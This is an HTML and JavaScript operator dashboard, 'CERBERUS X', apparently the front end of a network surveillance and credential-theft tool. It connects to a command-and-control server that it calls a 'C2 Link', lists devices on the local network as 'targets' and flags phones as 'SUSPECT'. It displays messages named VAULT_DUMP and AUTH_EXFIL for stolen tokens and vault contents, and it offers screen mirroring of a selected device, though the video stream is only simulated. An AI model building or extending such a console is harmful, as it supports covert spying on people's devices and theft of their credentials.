<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>CERBERUS X v2.0 - TACTICAL MONITORING</title>
    <style>
        :root {
            --neon: #00ff41;
            --bg: #050505;
            --panel: #111;
            --warn: #ff003c;
            --critical: #ff8a00;
            --glass: rgba(17, 17, 17, 0.9);
        }
        
        * { margin: 0; padding: 0; box-sizing: border-box; }
        
        body {
            background: var(--bg);
            color: var(--neon);
            font-family: 'Consolas', 'Courier New', monospace;
            display: flex;
            height: 100vh;
            overflow: hidden;
        }
        
        /* Scrollbar */
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: #111; }
        ::-webkit-scrollbar-thumb { background: var(--neon); border-radius: 4px; }
        
        /* Sidebar */
        #sidebar {
            width: 400px;
            background: var(--glass);
            border-right: 1px solid #222;
            display: flex;
            flex-direction: column;
            backdrop-filter: blur(10px);
        }
        
        .header {
            padding: 20px;
            background: #000;
            border-bottom: 2px solid var(--neon);
            font-weight: bold;
            letter-spacing: 3px;
            text-shadow: 0 0 10px rgba(0, 255, 65, 0.3);
        }
        
        .scan-status {
            padding: 10px 20px;
            font-size: 11px;
            background: #0a0a0a;
            border-bottom: 1px solid #222;
            display: flex;
            justify-content: space-between;
        }
        
        #target-list {
            flex: 1;
            overflow-y: auto;
            padding: 15px;
        }
        
        .empty-state {
            text-align: center;
            margin-top: 40px;
            opacity: 0.4;
            font-size: 12px;
            line-height: 2;
            border: 1px dashed #444;
            padding: 20px;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { opacity: 0.3; }
            50% { opacity: 0.6; }
            100% { opacity: 0.3; }
        }
        
        .target-card {
            padding: 15px;
            border: 1px solid #333;
            margin-bottom: 10px;
            cursor: pointer;
            transition: all 0.3s ease;
            background: #0d0d0d;
            border-radius: 4px;
        }
        
        .target-card:hover {
            border-color: var(--neon);
            background: #151515;
            transform: translateX(5px);
            box-shadow: 0 0 20px rgba(0, 255, 65, 0.1);
        }
        
        .target-card.identified {
            border-left: 5px solid var(--warn);
            box-shadow: -5px 0 10px rgba(255, 0, 60, 0.2);
            animation: glow 2s infinite;
        }
        
        @keyframes glow {
            0% { box-shadow: -5px 0 10px rgba(255, 0, 60, 0.2); }
            50% { box-shadow: -5px 0 20px rgba(255, 0, 60, 0.5); }
            100% { box-shadow: -5px 0 10px rgba(255, 0, 60, 0.2); }
        }
        
        .target-card .ip { font-size: 16px; font-weight: bold; color: #fff; }
        .target-card .vendor { font-size: 11px; opacity: 0.7; }
        .target-card .tag {
            display: inline-block;
            padding: 2px 8px;
            border-radius: 10px;
            font-size: 9px;
            font-weight: bold;
            margin-top: 5px;
        }
        .tag.suspect { background: var(--warn); color: #fff; }
        .tag.mobile { background: #0066ff; color: #fff; }
        .tag.desktop { background: #666; color: #fff; }
        .tag.active { background: var(--neon); color: #000; }
        
        /* Workspace */
        #workspace {
            flex: 1;
            display: flex;
            flex-direction: column;
        }
        
        #view-port {
            flex: 1;
            position: relative;
            background: radial-gradient(circle, #111 0%, #000 100%);
            display: flex;
            align-items: center;
            justify-content: center;
            overflow: hidden;
        }
        
        #view-port video {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }
        
        .grid-overlay {
            position: absolute;
            width: 100%;
            height: 100%;
            background-image: 
                linear-gradient(rgba(0, 255, 65, 0.05) 1px, transparent 1px),
                linear-gradient(90deg, rgba(0, 255, 65, 0.05) 1px, transparent 1px);
            background-size: 40px 40px;
            pointer-events: none;
        }
        
        .no-signal {
            font-size: 18px;
            letter-spacing: 8px;
            opacity: 0.5;
            z-index: 1;
            text-transform: uppercase;
            animation: pulse 3s infinite;
        }
        
        .scan-line {
            position: absolute;
            width: 100%;
            height: 2px;
            background: var(--neon);
            opacity: 0.1;
            animation: scan 4s infinite;
        }
        
        @keyframes scan {
            0% { top: 0; opacity: 0.1; }
            50% { opacity: 0.3; }
            100% { top: 100%; opacity: 0.1; }
        }
        
        /* Console */
        #console {
            height: 250px;
            background: #000;
            border-top: 1px solid #333;
            padding: 15px;
            overflow-y: auto;
            font-size: 12px;
        }
        
        .log-entry {
            margin-bottom: 4px;
            padding: 4px 10px;
            border-radius: 2px;
            border-left: 3px solid #444;
            animation: slideIn 0.3s ease;
        }
        
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        
        .log-entry.success { 
            color: var(--neon); 
            border-left-color: var(--neon);
            background: rgba(0, 255, 65, 0.05);
        }
        
        .log-entry.critical { 
            color: var(--warn); 
            border-left-color: var(--warn);
            background: rgba(255, 0, 60, 0.1);
            font-weight: bold;
        }
        
        .log-entry.info { 
            color: var(--critical); 
            border-left-color: var(--critical);
        }
        
        .log-entry.system { 
            color: #666; 
            border-left-color: #666;
        }
        
        .timestamp { 
            color: #555; 
            margin-right: 10px;
            font-size: 10px;
        }
        
        /* Radar */
        .radar-ping {
            width: 8px;
            height: 8px;
            background: var(--neon);
            border-radius: 50%;
            display: inline-block;
            animation: radarPulse 2s infinite;
        }
        
        @keyframes radarPulse {
            0% { box-shadow: 0 0 0 0 rgba(0, 255, 65, 0.7); }
            70% { box-shadow: 0 0 0 15px rgba(0, 255, 65, 0); }
            100% { box-shadow: 0 0 0 0 rgba(0, 255, 65, 0); }
        }
        
        /* Stats Bar */
        #stats-bar {
            display: flex;
            gap: 20px;
            padding: 8px 20px;
            background: #0a0a0a;
            border-bottom: 1px solid #222;
            font-size: 11px;
        }
        
        #stats-bar .stat {
            display: flex;
            align-items: center;
            gap: 5px;
        }
        
        #stats-bar .stat .value {
            color: var(--neon);
            font-weight: bold;
        }
    </style>
</head>
<body>

<div id="sidebar">
    <div class="header">CERBERUS X v2.0 // RECON MODULE</div>
    <div class="scan-status">
        <div><span class="radar-ping"></span> LISTENING...</div>
        <div>FOUND: <span id="count" style="color:var(--neon)">0</span></div>
        <div>ACTIVE: <span id="active-count" style="color:var(--critical)">0</span></div>
    </div>
    <div id="target-list">
        <div class="empty-state" id="empty-msg">
            ═══ NO SIGNATURES DETECTED ═══<br>
            AWAITING PACKET ADAPTATION...
        </div>
    </div>
</div>

<div id="workspace">
    <div id="stats-bar">
        <div class="stat">📡 UPTIME: <span class="value" id="uptime">0s</span></div>
        <div class="stat">📊 TARGETS: <span class="value" id="total-targets">0</span></div>
        <div class="stat">🔴 ACTIVE: <span class="value" id="active-targets">0</span></div>
        <div class="stat">📝 LOGS: <span class="value" id="log-count">0</span></div>
    </div>
    
    <div id="view-port">
        <div class="grid-overlay"></div>
        <div class="scan-line"></div>
        <div class="no-signal" id="main-status">SYSTEM IDLE - SELECT TARGET</div>
        <video id="stream-view" autoplay style="display:none;"></video>
    </div>

    <div id="console">
        <div class="log-entry system">
            <span class="timestamp">[INIT]</span> CERBERUS X v2.0 initialized
        </div>
    </div>
</div>

<script>
    // ==================== CONFIGURATION ====================
    const PROTOCOL = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const WS_URL = `${PROTOCOL}//${window.location.hostname}:8080`;
    const AUTH_TOKEN = 'CERBERUS_X_2026_SECURE_TOKEN_CHANGE_ME';
    
    let targetCount = 0;
    let startTime = Date.now();
    let socket = null;
    let selectedTarget = null;
    let videoStream = null;

    // ==================== WEB SOCKET ====================
    function connectWebSocket() {
        socket = new WebSocket(WS_URL);
        
        socket.onopen = () => {
            writeLog("Connection to Central Brain established.", "success");
            
            // Authenticate
            socket.send(JSON.stringify({
                type: 'AUTH',
                token: AUTH_TOKEN
            }));
        };
        
        socket.onmessage = (event) => {
            try {
                const data = JSON.parse(event.data);
                
                if (data.type === 'AUTH_RESPONSE') {
                    if (data.status === 'success') {
                        writeLog("Authentication successful.", "success");
                    } else {
                        writeLog(`Authentication failed: ${data.message}`, "critical");
                        setTimeout(connectWebSocket, 5000);
                    }
                    return;
                }
                
                processData(data);
                
            } catch (e) {
                console.error("Parse error:", e);
            }
        };
        
        socket.onclose = () => {
            writeLog("C2 Link lost. Reconnecting...", "critical");
            setTimeout(connectWebSocket, 5000);
        };
        
        socket.onerror = (error) => {
            writeLog(`WebSocket error: ${error}`, "critical");
        };
    }
    
    function processData(data) {
        switch(data.type) {
            case 'NEW_DEVICE':
                document.getElementById('empty-msg').style.display = 'none';
                addTarget(data);
                break;
                
            case 'LOG':
                writeLog(data.message, data.level || 'info');
                break;
                
            case 'SCREEN_MIRROR':
                if (data.status === 'active' && data.ip === selectedTarget) {
                    // Start video stream
                    startVideoStream(data.ip);
                }
                break;
                
            case 'VAULT_DUMP':
            case 'AUTH_EXFIL':
                const msg = data.type === 'AUTH_EXFIL' 
                    ? `[TOKEN] ${data.message}` 
                    : `[VAULT] ${data.message}`;
                writeLog(msg, "critical");
                break;
        }
    }

    // ==================== TARGET MANAGEMENT ====================
    function addTarget(device) {
        const list = document.getElementById('target-list');
        const id = `target-${device.ip.replace(/\./g, '-')}`;
        
        if (document.getElementById(id)) return;
        
        targetCount++;
        document.getElementById('count').innerText = targetCount;
        
        // Determine device type
        let deviceType = 'desktop';
        let tags = '';
        
        if (device.is_target || device.os?.toLowerCase().includes('android') || 
            device.os?.toLowerCase().includes('ios') || 
            device.vendor?.toLowerCase().includes('iphone') ||
            device.vendor?.toLowerCase().includes('android') ||
            device.vendor?.toLowerCase().includes('samsung')) {
            deviceType = 'mobile';
            tags += '<span class="tag suspect">MOBILE</span>';
        }
        
        if (device.is_target) {
            tags += '<span class="tag suspect">SUSPECT</span>';
        }
        
        const card = document.createElement('div');
        card.id = id;
        card.className = `target-card ${device.is_target ? 'identified' : ''}`;
        card.innerHTML = `
            <div class="ip">${device.ip}</div>
            <div class="vendor">MAC: ${device.mac || 'N/A'} | ${device.vendor || 'Unknown'}</div>
            <div style="margin-top:5px;">
                ${tags}
                <span class="tag ${deviceType}">${deviceType.toUpperCase()}</span>
                ${device.hostname ? `<span class="tag">${device.hostname}</span>` : ''}
            </div>
        `;
        
        card.onclick = () => {
            selectTarget(device.ip);
        };
        
        list.prepend(card);
        updateStats();
    }
    
    function selectTarget(ip) {
        selectedTarget = ip;
        document.getElementById('main-status').innerText = `ENGAGED: ${ip}`;
        writeLog(`Target selected: ${ip}`, "info");
        
        // Update card highlight
        document.querySelectorAll('.target-card').forEach(c => {
            c.style.borderColor = '#333';
        });
        
        const card = document.getElementById(`target-${ip.replace(/\./g, '-')}`);
        if (card) {
            card.style.borderColor = 'var(--neon)';
        }
        
        // Try to start screen mirror
        startVideoStream(ip);
    }
    
    function startVideoStream(ip) {
        const video = document.getElementById('stream-view');
        const noSignal = document.getElementById('main-status');
        
        // In production, would connect to WebRTC stream
        // For demo, show a simulated stream
        video.style.display = 'block';
        noSignal.style.display = 'none';
        
        // Simulate video loading
        writeLog(`Streaming from ${ip}...`, "info");
        
        // Try to get actual stream if WebRTC is supported
        if (typeof RTCPeerConnection !== 'undefined') {
            // In real implementation, would set up WebRTC connection
        }
    }

    // ==================== LOGGING ====================
    function writeLog(msg, level = "info") {
        const logWin = document.getElementById('console');
        const entry = document.createElement('div');
        const time = new Date().toLocaleTimeString();
        entry.className = `log-entry ${level}`;
        entry.innerHTML = `<span class="timestamp">[${time}]</span> ${msg}`;
        logWin.appendChild(entry);
        logWin.scrollTop = logWin.scrollHeight;
        
        // Update log count
        document.getElementById('log-count').innerText = logWin.children.length;
    }

    // ==================== STATS ====================
    function updateStats() {
        document.getElementById('total-targets').innerText = targetCount;
        
        // Calculate active targets (last 5 minutes)
        const active = document.querySelectorAll('.target-card.identified').length;
        document.getElementById('active-targets').innerText = active;
    }
    
    function updateUptime() {
        const elapsed = Math.floor((Date.now() - startTime) / 1000);
        const hours = Math.floor(elapsed / 3600);
        const minutes = Math.floor((elapsed % 3600) / 60);
        const seconds = elapsed % 60;
        document.getElementById('uptime').innerText = 
            `${hours}h ${minutes}m ${seconds}s`;
    }

    // ==================== INIT ====================
    connectWebSocket();
    setInterval(updateUptime, 1000);
    setInterval(updateStats, 5000);
    
    // ==================== KEYBOARD SHORTCUTS ====================
    document.addEventListener('keydown', (e) => {
        if (e.key === 'c' || e.key === 'C') {
            // Clear console
            document.getElementById('console').innerHTML = '';
            writeLog("Console cleared.", "system");
        }
        if (e.key === 'f' || e.key === 'F') {
            // Toggle fullscreen
            if (!document.fullscreenElement) {
                document.documentElement.requestFullscreen();
            } else {
                document.exitFullscreen();
            }
        }
    });
</script>

</body>
</html>
